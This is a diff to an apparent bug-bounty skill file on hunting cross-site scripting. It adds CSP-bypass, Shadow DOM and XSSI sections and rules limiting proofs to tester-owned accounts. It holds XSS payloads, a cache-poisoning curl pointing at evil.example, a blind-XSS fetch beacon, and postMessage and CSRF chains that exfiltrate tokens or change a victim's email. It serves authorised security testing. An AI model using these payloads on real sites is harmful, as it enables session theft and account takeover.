@@ -1,7 +1,7 @@
 ---
 name: hunt-xss
-description: Hunting skill for xss vulnerabilities. Built from 174 public bug bounty reports. Use when hunting xss on any target. For markup injection that reflects raw HTML but does NOT execute JavaScript (no `<script>`/event-handler execution), see hunt-html-injection — escalate here once script execution is possible.
-sources: github, hackerone_public
+description: "Hunting skill for xss vulnerabilities. Built from 174 public bug bounty reports. Use when hunting xss on any target. For markup injection that reflects raw HTML but does NOT execute JavaScript (no `<script>`/event-handler execution), see hunt-html-injection — escalate here once script execution is possible. Also covers Shadow DOM and declarative shadow roots as a sink context, SOME (Same Origin Method Execution) callback abuse, XSSI (cross-site script inclusion), WebAssembly linear-memory XSS, and CSP bypass depth: strict-dynamic and script gadgets, nonce reuse and nonce theft, base-uri omission, JSONP on allowlisted origins, and Chrome disk-cache/bfcache nonce reuse."
+sources: github, hackerone_public, mdn_web_docs, w3c_csp3_spec, chrome_developers, chromium_source, github_security_advisories, public_research, hacktricks_coverage_checklist
 report_count: 174
 ---
 
@@ -160,7 +160,7 @@ $(location
 
 6. **Test markdown/documentation renderers** — In wiki, README, or doc fields, try: `[text](javascript:alert(1))`, inline HTML injection, Kroki/Mermaid payloads, RDoc `link:javascript:` syntax.
 
-7. **Check redirect parameters** — Test `?redirect=javascript:alert(1)` and `?return_url=//evil.com` — look for single-click XSS via improper redirect sanitization.
+7. **Check redirect parameters** — Test `?redirect=javascript:alert(1)` and `?return_url=//evil.example` — look for single-click XSS via improper redirect sanitization.
 
 8. **Probe UTM and analytics parameters** — `utm_source`, `utm_medium`, `utm_campaign` are often reflected without sanitization on marketing pages.
 
@@ -232,7 +232,7 @@ plantuml
 ```javascript
 // In browser console to test sink
 location.hash = '#"><img src=x onerror=alert(1)>'
-location.href = 'https://target.com/page#<script>alert(1)</script>'
+location.href = 'https://target.example/page#<script>alert(1)</script>'
 ```
 
 **Grep patterns for source review:**
@@ -249,15 +249,15 @@ grep -i "utm_source\|utm_medium\|redirect\|return_url\|callback\|next" --include
 
 **Curl to detect reflection:**
 ```bash
-curl -sk "https://target.com/search?q=XSSCANARY" | grep -i "XSSCANARY"
-curl -sk "https://target.com/page?utm_source=XSSCANARY" | grep -i "XSSCANARY"
+curl -sk "https://target.example/search?q=XSSCANARY" | grep -i "XSSCANARY"
+curl -sk "https://target.example/page?utm_source=XSSCANARY" | grep -i "XSSCANARY"
 ```
 
 **Cache poisoning test:**
 ```bash
 # Send payload then fetch with clean session to see if cached
-curl -sk "https://target.com/page?param=<script>alert(1)</script>" -H "X-Forwarded-Host: evil.com"
-curl -sk "https://target.com/page" | grep -i "evil.com"
+curl -sk "https://target.example/page?param=<script>alert(1)</script>" -H "X-Forwarded-Host: evil.example"
+curl -sk "https://target.example/page" | grep -i "evil.example"
 ```
 
 ---
@@ -331,7 +331,7 @@ curl -sk "https://target.com/page" | grep -i "evil.com"
 ```
 ?next=javascript://%0aalert(1)
 ?next=javascript&colon;alert(1)
-?redirect=//evil.com/%0d%0a%0d%0a<script>alert(1)</script>
+?redirect=//evil.example/%0d%0a%0d%0a<script>alert(1)</script>
 ```
 
 **AngularJS client-side template injection (CSTI) & sandbox escapes:**
@@ -408,15 +408,15 @@ XSS as a standalone finding gets paid at Low-Medium on mature programs. Real pay
 
 - **A.** Identify a file-upload feature that accepts `image/svg+xml`. SVG files are XML and can contain `<script>` tags — many sanitisers process PNG/JPG but pass SVG through unmodified.
 - **B.** CSP frequently applies to HTML responses but NOT to `image/svg+xml` responses. The SVG executes JS in the context of whichever origin serves it.
-- **C.** If the SVG is served same-origin (common when uploads go to `target.com/uploads/<sha>.svg`), the executing JS has full session-cookie access and can call any same-origin API.
+- **C.** If the SVG is served same-origin (common when uploads go to `target.example/uploads/<sha>.svg`), the executing JS has full session-cookie access and can call any same-origin API.
 - **Impact:** Stored XSS on the trusted origin without going through any reflected/stored content vector — bypasses CSP entirely; pulls session cookies, calls password-change endpoints, ATO.
 - **Real shape:** Multiple disclosed cases across SaaS uploaders; cross-refs `hunt-file-upload` SVG section and `hunt-xxe` Disclosed Report Citation #3 and #4 (Zivver/Lab45 SVG-upload chains).
 
 ### Chain 5 — postMessage XSS + Origin Check Bypass → Cross-Origin Token Exfil → ATO
 
-- **A.** Identify a `window.addEventListener('message', handler)` where `handler` does NOT check `event.origin` (or checks it with a `indexOf`/`endsWith` that fails on `target.com.attacker.com`).
-- **B.** Attacker page opens `target.com` in a popup or iframe. Once loaded, sends a `postMessage` payload that the handler evals, processes as XSS, or uses to extract `document.cookie`.
-- **C.** Handler executes in `target.com` context; response is `postMessage`'d back to attacker page via `event.source.postMessage(stolenData, '*')`.
+- **A.** Identify a `window.addEventListener('message', handler)` where `handler` does NOT check `event.origin` (or checks it with a `indexOf`/`endsWith` that fails on `target.example.attacker.example`).
+- **B.** Attacker page opens `target.example` in a popup or iframe. Once loaded, sends a `postMessage` payload that the handler evals, processes as XSS, or uses to extract `document.cookie`.
+- **C.** Handler executes in `target.example` context; response is `postMessage`'d back to attacker page via `event.source.postMessage(stolenData, '*')`.
 - **Impact:** Cross-origin JS execution and exfil with no CSP violation — `postMessage` is a legitimate cross-origin channel; CSP doesn't gate it. Token theft / session hijack.
 - **Real shape:** Detectify "Dirty Dancing" multi-vendor postMessage gadgets (2022); Zoom OAuth + postMessage chain (2024). Cross-refs `hunt-oauth` Disclosed Report Citation #19, #20.
 
@@ -441,10 +441,50 @@ Cross-references:
 
 ---
 
+## Advanced Sinks, Callbacks & CSP Depth
+
+Surfaces the sections above name but never open. The depth lives in `references/`, where every entry carries a **Status** line (what is verified, against which source, on which date), a **Killed by** line and a **Proof bar**. An entry with no Status line is unverified; do not report it as live.
+
+- **Shadow DOM:** a sanitizer that walks the light DOM misses a shadow tree entirely, and `mode: "closed"` hides a root from `element.shadowRoot` but not from same-realm script. `innerHTML` never creates a declarative shadow root; `setHTMLUnsafe()` and `parseHTMLUnsafe()` do, which is what turns `<template shadowrootmode>` into a sink context. See `shadow-dom-and-modern-sinks.md`.
+- **WebAssembly linear memory:** a writable HTML format template inside `WebAssembly.Memory` is overwritten so that correctly sanitized input lands in an event-handler position. Source-to-sink analysis misses it because the taint never touches a JS value. Same file.
+- **SOME (Same Origin Method Execution):** the escalation for a `?callback=` reflection restricted to `[\w.]`, where a borrowed same-origin document reached through `window.opener` turns an apparently useless JSONP reflection into invocation of a real method. See `callback-and-script-inclusion.md`.
+- **XSSI (cross-site script inclusion):** include a victim's authenticated JavaScript or JSONP response as a `<script>` and read the data it defines. Same file, which also sets the boundary against `hunt-xs-leaks`: that skill owns the load-versus-error oracle bit, this one owns reading the body.
+- **CSP depth:** step 9 and the Bypass Techniques list stop at the names. `csp-bypass-depth.md` carries `'strict-dynamic'` semantics with its script-gadget failure mode, nonce reuse and what nonce hiding already killed, `base-uri` omission (it has no `default-src` fallback), JSONP on allowlisted origins, and Chrome's bfcache-to-disk-cache fallback as a nonce-reuse accelerator.
+
+---
+
+## Proof Discipline for Stored, Blind & Self-XSS
+
+Extends the OOB gate and Gate 0 above, and governs every payload in this skill, including the exfiltration shapes sketched in Chains 3 and 5 and in the `hunt-csrf` cross-reference. Those describe what an attacker could do. What you run is narrower:
+
+- **Never write a payload that exfiltrates real user data, posts content, or performs an action as another user.** Proof is execution in the tester's own browser, in the tester's own session. A payload that reads `document.cookie`, scrapes page content, or calls a state-changing endpoint on someone else's behalf is out of scope however good the PoC looks.
+- **`alert(<CANARY>)` is a detection marker, not a finding.** It proves the context is executable; Gate 0 still has to be answered.
+- **Stored XSS confirmed only in your own view is not yet cross-user.** Prove it reaches other users with a second account that is also the tester's: store from account A, log in as account B in a clean profile, and show the canary firing there. One account plus an assumption is the most common downgrade on this class.
+- **Blind-XSS callbacks hit a collector you control**, and that collector must not log third-party data. The payload captures a canary only: a request to a per-sink subdomain is what proves execution. Do not append `document.cookie`, `document.domain`, `location.href` or page HTML to the beacon. `<svg onload=fetch('//bxss-<sink>.<collab>/x')>` is the whole payload.
+- **Self-XSS is not a finding on its own** and sits on the repo's always-rejected list (`cbh/cli.py`, mirrored in `security-arsenal`). The exact extra condition for promotion: a demonstrated delivery path that plants the payload into the victim's stored state with no paste and no self-inflicted action by the victim. Chain 2's CSRF write of the field is one such path. Demonstrate that plant end to end between two tester-owned accounts; without it the report stays a non-finding.
+- **Stored payloads persist after you leave.** Keep an inventory while you work: URL, field, canary value, timestamp. Delete each one, or hand the inventory to the target if deletion is not possible, and keep anything undeletable to an inert marker.
+
+---
+
 ## Related Skills & Chains
 
-- **`hunt-cache-poison`** — Reflected XSS becomes stored-equivalent at CDN scale when the vulnerable parameter is unkeyed. Chain primitive: `X-Forwarded-Host: attacker.com` poisons a cached response whose `<script src=...>` now points at attacker.com → every CDN-edge visitor executes attacker JS without any per-victim interaction.
+- **`hunt-cache-poison`** — Reflected XSS becomes stored-equivalent at CDN scale when the vulnerable parameter is unkeyed. Chain primitive: `X-Forwarded-Host: attacker.example` poisons a cached response whose `<script src=...>` now points at attacker.example → every CDN-edge visitor executes attacker JS without any per-victim interaction.
 - **`hunt-csrf`** — XSS on origin auto-defeats SameSite=Lax and same-origin checks for state-changing endpoints. Chain primitive: stored XSS in profile bio → fetch(`/settings/email`, {method:'POST', body:'email=attacker@evil'}) executes with victim's cookies and origin → silent email takeover → password reset → full ATO without the victim ever leaving the page.
 - **`hunt-http-smuggling`** — Smuggling delivers an XSS payload into the response queue of the NEXT victim's request, even on endpoints that sanitize their own inputs. Chain primitive: smuggle a request whose response (carrying attacker HTML) is served as the body of the next legitimate user's GET / → reflected XSS at every visitor without any URL parameter visible in their address bar.
 - **`security-arsenal`** — Reach for the XSS payload bank (SVG+style, math+style mXSS, CSP-bypass JSONP gadgets, HTML5 event handlers WAFs miss) before hand-crafting payloads; also the always-rejected list to confirm self-XSS / alert-only PoCs are not submittable.
 - **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on stored XSS that only fires in the attacker's own session, or before claiming reflected XSS where the canary appears HTML-encoded (`&lt;`) in the response body — those are the two most common downgrade-to-N/A traps.
+- **`hunt-dom`:** owns DOM sources and sinks as a class, DOM clobbering, service-worker abuse, postMessage hijacking and same-origin CSS exfiltration. Boundary: a JS source reaching a JS sink, or a clobbered global, is that skill's finding. This skill owns the shadow-tree and WASM-linear-memory contexts a light-DOM review walks past; Chain 5 above stays here only as a chain into XSS.
+- **`hunt-xs-leaks`:** owns cross-origin side channels. XSSI boundary: reading the body of a victim's script-typed response is here, inferring one bit from whether the include loaded or errored (the CORB/ORB oracle) is there. Its `references/defences-and-headers.md` holds the dated `SameSite` and third-party-cookie matrix that decides whether any include-based probe is authenticated at all.
+- **`hunt-browser-extension`:** owns XSS inside an extension context (extension pages, content scripts, the enforced MV3 CSP). A payload that only executes in the extension's own origin belongs there.
+- **`hunt-electron`:** owns XSS-to-OS escalation in desktop apps. Once script execution in an Electron renderer is confirmed, the escalation to `require('child_process')` or a preload bridge is that skill's.
+- **`hunt-html-injection`:** owns raw-HTML injection that does not execute script, including an inert `<template>` echoed back with nothing firing.
+
+---
+
+## References Index
+
+| File | Coverage | Trigger phrases |
+|---|---|---|
+| `shadow-dom-and-modern-sinks.md` | Shadow DOM as a sink context: open versus closed roots, declarative shadow DOM browser support, why `innerHTML` is safe against it while `setHTMLUnsafe`/`parseHTMLUnsafe` are not, live-DOM sanitizer returns (`IN_PLACE`/`RETURN_DOM`), DOMPurify's documented closed-root limit, `attachShadow` hooking, the `slotchange` gadget; WASM linear-memory template overwrite and why source-to-sink analysis misses it, with read-only memory-recon helpers; the markdown-renderer delta (sanitize-then-render ordering, mXSS in the final DOM, `<base>` rewriting, CVE-2025-54075) | shadow DOM, shadow root, closed shadow root, declarative shadow DOM, shadowrootmode, setHTMLUnsafe, parseHTMLUnsafe, web component XSS, DOMPurify RETURN_DOM, slotchange, WebAssembly XSS, WASM linear memory, HEAPU8, Emscripten, template overwrite, markdown renderer XSS, mXSS |
+| `callback-and-script-inclusion.md` | SOME (Same Origin Method Execution): the five-step opener chain, callback character restrictions, what COOP does to it, and a non-state-changing proof bar; XSSI: the 2015 dynamic-JavaScript measurement, the two gates (`SameSite`, Chrome CORB rules quoted exactly), live shapes (JS-typed per-user responses, JSONP, MIME confusion without `nosniff`), the dead pre-ES5 shapes, a two-tester-account probe; ownership table against `hunt-xs-leaks`, `hunt-cors` and `hunt-session` | SOME, same origin method execution, callback parameter, JSONP reflection, window.opener, COOP, XSSI, cross-site script inclusion, dynamic JavaScript leak, CORB, nosniff, content sniffing leak, JSON security prefix |
+| `csp-bypass-depth.md` | `'strict-dynamic'` (host allowlist ignored, parser-inserted versus `createElement`, script gadgets, CSP1/2/3 compatibility trap) and Trusted Types as the kill; nonce reuse and nonce theft (nonce hiding, `<meta>` CSP leak, cached nonces, reflected nonces); `base-uri` omission with no `default-src` fallback; JSONP on allowlisted origins; Chrome disk-cache/bfcache-to-XSS including the `Cache-Control: no-store` bfcache change that invalidates older PoCs | strict-dynamic, script gadget, code reuse attack, CSP bypass, nonce reuse, nonce theft, nonce hiding, meta CSP, base-uri, base tag injection, JSONP allowlist, require-trusted-types-for, trusted types, bfcache, disk cache, notRestoredReasons, browser cache to XSS |
